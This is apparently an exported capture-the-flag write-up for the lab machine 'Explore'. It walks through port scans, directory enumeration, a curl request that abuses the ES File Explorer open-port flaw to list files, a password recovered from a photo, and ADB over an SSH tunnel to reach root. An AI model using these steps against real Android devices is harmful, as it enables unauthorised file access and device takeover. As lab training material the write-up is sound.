<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Explore </title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
}

.simple-table-header {
	background: rgb(247, 246, 243);
	color: black;
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(145, 145, 142, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(187, 132, 108, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(215, 129, 58, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 148, 51, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(108, 155, 125, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(91, 151, 189, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(167, 130, 195, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(205, 116, 159, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(225, 111, 100, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(145, 145, 142, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(187, 132, 108, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(215, 129, 58, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 148, 51, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(108, 155, 125, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(91, 151, 189, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(167, 130, 195, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(205, 116, 159, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(225, 111, 100, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="4b8da57e-6412-4dc0-94d9-c8c19eec2194" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🌲</span></div><h1 class="page-title">Explore </h1></header><div class="page-body"><p id="7618ac99-9165-4fea-912d-e54eb4b4f6f5" class="">To start the challenge first we scan open ports using network mapper:</p><pre id="eb2f5103-3b1a-4b44-8dfc-82159dd665ad" class="code"><code>┌─[✗]─[bracketz@marians]─[~]
└──╼ $nmap -p- -T4 10.10.10.247 -Pn -v
Host discovery disabled (-Pn). All addresses will be marked &#x27;up&#x27; and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 02:35 -03
Initiating Parallel DNS resolution of 1 host. at 02:35

Initiating Connect Scan at 02:35
Scanning 10.10.10.247 [65535 ports]

Host is up (0.18s latency).
Not shown: 65496 closed ports
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
4506/tcp  filtered unknown
5555/tcp  filtered freeciv
5698/tcp  filtered unknown
9774/tcp  filtered unknown
10609/tcp filtered unknown
11334/tcp filtered unknown
13553/tcp filtered unknown
16274/tcp filtered unknown
17237/tcp filtered unknown
18647/tcp filtered unknown
18675/tcp filtered unknown
19318/tcp filtered unknown
21427/tcp filtered unknown
22967/tcp filtered unknown
24235/tcp filtered unknown
27026/tcp filtered unknown
28451/tcp filtered unknown
29222/tcp filtered unknown
29311/tcp filtered unknown
29760/tcp filtered unknown
33936/tcp filtered unknown
34144/tcp filtered unknown
34609/tcp filtered unknown
40064/tcp filtered unknown
41620/tcp filtered unknown
41912/tcp filtered unknown
42135/tcp open     unknown
44057/tcp open     unknown
48411/tcp filtered unknown
49231/tcp filtered unknown
49392/tcp filtered unknown
50695/tcp filtered unknown
55238/tcp filtered unknown
55991/tcp filtered unknown
58999/tcp filtered unknown
59777/tcp open     unknown
61866/tcp filtered unknown
63166/tcp filtered unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2661.53 seconds</code></pre><pre id="effca26c-5ce6-4074-9ea3-9f20037fd6a1" class="code"><code>┌─[bracketz@marians]─[~]
└──╼ $nmap -sV -p- 10.10.10.247 -T4
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 11:00 -03
Warning: 10.10.10.247 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.247
Host is up (0.59s latency).
Not shown: 65426 closed ports, 106 filtered ports
PORT      STATE SERVICE    VERSION
2222/tcp  open  ssh        (protocol 2.0)
44629/tcp open  tcpwrapped
59777/tcp open  http       Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2222-TCP:V=7.91%I=7%D=6/27%Time=60D895AB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,&quot;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4426.56 seconds</code></pre><p id="d56c8b8c-e7ef-4f64-8f67-ee1da770186b" class="">At port 59777 we have a Bukkit JSONAPI server, responsible to make a Minecraft PE server</p><figure id="47682a67-12c6-4ef4-91ec-23f5aab4dd6e" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled.png"><img style="width:984px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled.png"/></a></figure><p id="06ca33a2-8559-46cc-b61b-f6499f1c3963" class="">And the port 44057 have a ES File Explorer :</p><figure id="eaeccf55-1ba1-4b3e-8624-4dbb89366719" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%201.png"><img style="width:791px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%201.png"/></a></figure><p id="9ae74b7f-9c47-4490-9050-9de8d52f4e8b" class="">Searching a little bit, i found one vulnerability that allow us get or execute commands via http header or URL :</p><p id="ba6aa514-6145-41b5-87c6-ad33aaa94892" class=""><mark class="highlight-blue">P</mark><strong><mark class="highlight-blue">oc </mark></strong>- <a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln">https://github.com/fs0c131y/ESFileExplorerOpenPortVuln</a></p><p id="c004ae48-671b-4084-b3f8-c1f9384c633e" class=""><strong><mark class="highlight-blue">Twitter post of vulnerability </mark></strong>- <a href="https://twitter.com/fs0c131y/status/1085460755313508352">https://twitter.com/fs0c131y/status/1085460755313508352</a></p><p id="47bbaa3f-a530-4268-8141-9e1308197f97" class="">
</p><p id="2d47e7f7-599f-4fdc-a703-c881af743166" class="">Gobuster scan in port to discover file structure, we can see the android folders and in each folder we can explore more and more to get the files using gobuster passing the PATH that you wish.</p><pre id="9eac8922-c8c5-47af-9a67-584f819c4b7e" class="code"><code>┌─[✗]─[bracketz@marians]─[~]
└──╼ $gobuster dir -u http://10.10.10.247:59777/ -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.247:59777/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/27 02:33:34 Starting gobuster in directory enumeration mode
===============================================================
/bin                  (Status: 301) [Size: 63] [--&gt; /bin/]
/cache                (Status: 301) [Size: 67] [--&gt; /cache/]
/config               (Status: 301) [Size: 69] [--&gt; /config/]
/d                    (Status: 301) [Size: 59] [--&gt; /d/]     
/data                 (Status: 301) [Size: 65] [--&gt; /data/]  
/dev                  (Status: 301) [Size: 63] [--&gt; /dev/]   
/etc                  (Status: 301) [Size: 63] [--&gt; /etc/]   
/init                 (Status: 403) [Size: 31]               
/lib                  (Status: 301) [Size: 63] [--&gt; /lib/]   
/oem                  (Status: 301) [Size: 63] [--&gt; /oem/]   
/proc                 (Status: 301) [Size: 65] [--&gt; /proc/]  
/product              (Status: 301) [Size: 71] [--&gt; /product/]
/sbin                 (Status: 301) [Size: 65] [--&gt; /sbin/]   
/storage              (Status: 301) [Size: 71] [--&gt; /storage/]
/sys                  (Status: 301) [Size: 63] [--&gt; /sys/]    
/system               (Status: 301) [Size: 69] [--&gt; /system/] 
/vendor               (Status: 301) [Size: 69] [--&gt; /vendor/] 
                                                              
===============================================================
2021/06/27 02:46:56 Finished
===============================================================</code></pre><figure id="3abd5907-9025-486d-a362-b0bc480fcd2e" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%202.png"><img style="width:1439px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%202.png"/></a></figure><figure id="0a86ce87-c9e1-4b0d-9fdb-e315de2ef575" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%203.png"><img style="width:1281px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%203.png"/></a></figure><p id="6aa976dd-d8a9-414a-afdf-ca320cde0a56" class="">Using vulnerability way we can list all archives in directory:</p><pre id="0667dcb9-d85a-4965-8b6b-a49daa149514" class="code"><code>curl --header &quot;Content-Type: application/json&quot; --request POST --data &#x27;{&quot;command&quot;:&quot;listFiles&quot;}&#x27; http://10.10.10.247:59777/</code></pre><figure id="866f82ed-f34b-48c8-9914-314d0e9a59e9" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%204.png"><img style="width:1623px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%204.png"/></a></figure><figure id="1928a77e-133c-4a0a-b2f9-66a25409d8aa" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%205.png"><img style="width:1281px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%205.png"/></a></figure><p id="873ef7db-c629-4885-be0a-d9a7e2654432" class="">Entering in sdcard folder retrive us the user.txt flag, after copy the return paste in your browser to visualize:</p><figure id="3d918733-f50c-466f-8f4d-6112df3d83c7" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%206.png"><img style="width:1495px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%206.png"/></a></figure><figure id="cedef6a9-77b3-4bd6-93b6-90e436e4287f" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%207.png"><img style="width:713px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%207.png"/></a></figure><p id="1375398c-b0f5-4261-877d-b02ba905fdb0" class="">Changing the command listFiles with listPics shows the pictures directory, open each picture i found one picture of notebook written a password :</p><figure id="49ce673a-cd31-4644-891c-de60ef0983ce" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%208.png"><img style="width:950px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%208.png"/></a></figure><figure id="b2aa30dc-9e73-48bc-9241-291d4ee12d91" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%209.png"><img style="width:958px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%209.png"/></a></figure><p id="ee38d808-9d15-47c9-963c-b053fecfead2" class="">Rewriting password: Kr1sT!5h@Rp3xPl0r3!</p><figure id="86bdd3aa-beb4-4c61-9706-9afec9332730" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2010.png"><img style="width:802px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2010.png"/></a></figure><p id="0ea3905a-0e81-4b3a-a72c-d6142bd16444" class="">Interesting ports running :</p><figure id="b71f1490-4cc7-4874-ae61-e7314cb62209" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2011.png"><img style="width:1368px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2011.png"/></a></figure><p id="9f89944f-79e0-4585-803a-c5fc58078e1e" class="">In process -A adbd service are running on shell user.</p><figure id="15c2133a-a7c0-4a31-8ee5-2cd9b3a3f66c" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2012.png"><img style="width:1481px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2012.png"/></a></figure><pre id="7303fba3-ae54-4f37-b56e-5ea85b891cf8" class="code"><code>Active Internet connections (established and servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
tcp6       0      0 ::ffff:10.10.10.2:43881 :::*                    LISTEN      -
tcp6       0      0 :::2222                 :::*                    LISTEN      3630/net.xnano.android.sshserver
tcp6       0      0 ::ffff:127.0.0.1:34511  :::*                    LISTEN      -
tcp6       0      0 :::5555                 :::*                    LISTEN      -
tcp6       0      0 :::42135                :::*                    LISTEN      -
tcp6       0      0 :::59777                :::*                    LISTEN      -</code></pre><p id="65bd9a03-199b-493a-8e44-6239c1e89ec0" class="">Making port-forwarding in SSH with port 5555 spawn android debugger and connect to <a href="http://localhost">localhost</a>, just localhost without use port :. </p><figure id="30646338-3d76-4a37-857e-3c1b7a8fec83" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2013.png"><img style="width:1909px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2013.png"/></a></figure><figure id="20429f06-d4e6-4ba1-a39b-378ce2a6762c" class="image"><a href="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2014.png"><img style="width:804px" src="Explore%2047682a6712c64ef491ec23f5aab4dd6e/Untitled%2014.png"/></a></figure><p id="9ba8d04e-0d8f-4c96-9f5e-8a43a9b7b3fc" class="">And now get the root flag in data directory.</p><p id="63d68567-36ca-4166-9323-b527df06918b" class="">I do a simple script to interact with the vulnerability:</p><figure id="e44ccc68-0f63-418e-bb0e-f1cf7ac114b4"><div class="source">https://github.com/sidhawkss/ES-File-Explorer-Vulnerability</div></figure><p id="71f88175-533d-45c7-8da1-1b2d7b457950" class="">
</p></div></article></body></html>